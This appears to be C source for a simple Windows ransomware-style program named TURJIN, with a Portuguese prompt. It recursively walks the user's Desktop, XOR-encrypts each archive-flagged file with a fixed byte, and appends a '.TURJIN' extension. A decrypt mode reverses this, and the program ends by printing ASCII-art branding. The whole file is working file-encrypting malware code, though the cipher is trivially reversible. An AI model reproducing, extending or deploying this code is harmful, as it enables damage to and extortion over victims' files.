#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#define RELATIVE_FOLDER "\\Desktop" // 0 - User's path
#define CRYPTO_NUM 21
#define CRYPTO_EXT ".TURJIN"
#define CRYPTO_EXT_LEN 7
#define CRYPTO_ENV_NAME "H43_xor_encryption"
#define CRYPTO_ENV_VALUE "TURJ"

int encrypt = -1; // 1 - encrypt, 0 - decrypt, -1 - undefined

void print_ascii_art() {


	puts("\n"
	"TTTTTTTTTTTTTTTTTTTTTTTUUUUUUUU     UUUUUUUURRRRRRRRRRRRRRRRR             JJJJJJJJJJJIIIIIIIIIINNNNNNNN        NNNNNNNN\n"
	"T:::::::::::::::::::::TU::::::U     U::::::UR::::::::::::::::R            J:::::::::JI::::::::IN:::::::N       N::::::N\n"
	"T:::::::::::::::::::::TU::::::U     U::::::UR::::::RRRRRR:::::R           J:::::::::JI::::::::IN::::::::N      N::::::N\n"
	"T:::::TT:::::::TT:::::TUU:::::U     U:::::UURR:::::R     R:::::R          JJ:::::::JJII::::::IIN:::::::::N     N::::::N\n"
	"TTTTTT  T:::::T  TTTTTT U:::::U     U:::::U   R::::R     R:::::R            J:::::J    I::::I  N::::::::::N    N::::::N\n"
	"        T:::::T         U:::::D     D:::::U   R::::R     R:::::R            J:::::J    I::::I  N:::::::::::N   N::::::N\n"
	"        T:::::T         U:::::D     D:::::U   R::::RRRRRR:::::R             J:::::J    I::::I  N:::::::N::::N  N::::::N\n"
	"        T:::::T         U:::::D     D:::::U   R:::::::::::::RR              J:::::j    I::::I  N::::::N N::::N N::::::N\n"
	"        T:::::T         U:::::D     D:::::U   R::::RRRRRR:::::R             J:::::J    I::::I  N::::::N  N::::N:::::::N\n"
	"        T:::::T         U:::::D     D:::::U   R::::R     R:::::RJJJJJJJ     J:::::J    I::::I  N::::::N   N:::::::::::N\n"
	"        T:::::T         U:::::D     D:::::U   R::::R     R:::::RJ:::::J     J:::::J    I::::I  N::::::N    N::::::::::N\n"
	"        T:::::T         U::::::U   U::::::U   R::::R     R:::::RJ::::::J   J::::::J    I::::I  N::::::N     N:::::::::N\n"
	"      TT:::::::TT       U:::::::UUU:::::::U RR:::::R     R:::::RJ:::::::JJJ:::::::J  II::::::IIN::::::N      N::::::::N\n"
	"      T:::::::::T        UU:::::::::::::UU  R::::::R     R:::::R JJ:::::::::::::JJ   I::::::::IN::::::N       N:::::::N\n"
	"      T:::::::::T          UU:::::::::UU    R::::::R     R:::::R   JJ:::::::::JJ     I::::::::IN::::::N        N::::::N\n"
	"      TTTTTTTTTTT            UUUUUUUUU      RRRRRRRR     RRRRRRR     JJJJJJJJJ       IIIIIIIIIINNNNNNNN         NNNNNNN\n");
	
		system("pause");
}


void xor_encryption (char* file) {
	printf("%s\n",file);
	char* ext = strrchr(file, '.');

	if (encrypt == -1)
		encrypt = strcmp(ext, CRYPTO_EXT) & 1;

	else if (encrypt != (strcmp(ext, CRYPTO_EXT) & 1))
		return;

	FILE *fp;
	char *content;
	long length;

	fp = fopen(file, "rb+");

	if (fp) {

		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		fseek(fp, 0, SEEK_SET);
		content = malloc(length + 1);

		if (content) {

			length = fread(content, 1, length, fp);

			if (length) {

				rewind(fp);

				char* tmp = content;
				for (int i = 0; i < length; tmp++, i++)
					*tmp = *tmp ^ CRYPTO_NUM;

				fwrite(content, 1, length, fp);
			}
			free(content);
		}

		fclose(fp);
	}

	if (encrypt) {

		char* new_file = (char *) malloc(strlen(file) + CRYPTO_EXT_LEN + 1);
		strcpy(new_file, file);
		strcat(new_file, CRYPTO_EXT);
		rename(file, new_file);
		free(new_file);
	}
	else {

		char* old_file = strdup(file);
		*ext = '\0';
		rename(old_file, file);
		free(old_file);
	}
}

void files_tree(const char *folder) {

    char wildcard[MAX_PATH];
    sprintf(wildcard, "%s\\*", folder);
    WIN32_FIND_DATA fd;
    HANDLE handle = FindFirstFile(wildcard, &fd);

    if(handle == INVALID_HANDLE_VALUE) return;

    do {

        if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
        	continue;

	char path[MAX_PATH];
        sprintf(path, "%s\\%s", folder, fd.cFileName);

        if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
		files_tree(path);
		
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
			xor_encryption(path);
			//puts(path);

    } while(FindNextFile(handle, &fd));

    FindClose(handle);
}

int main(void) {
	
	printf("Qual a sua opcao? ");
	scanf("%i", &encrypt);
	
	if (1 == 1) {
		
		void* home_path = getenv("USERPROFILE");
		void* path = home_path;

		if (RELATIVE_FOLDER) {

			path = malloc(strlen(home_path) + strlen(RELATIVE_FOLDER) + 1);
			strcpy(path, home_path);
			strcat(path, RELATIVE_FOLDER);
		}

		files_tree(path);

		if (RELATIVE_FOLDER)
			free(path);
	}
	
	print_ascii_art();
	return 0;
}
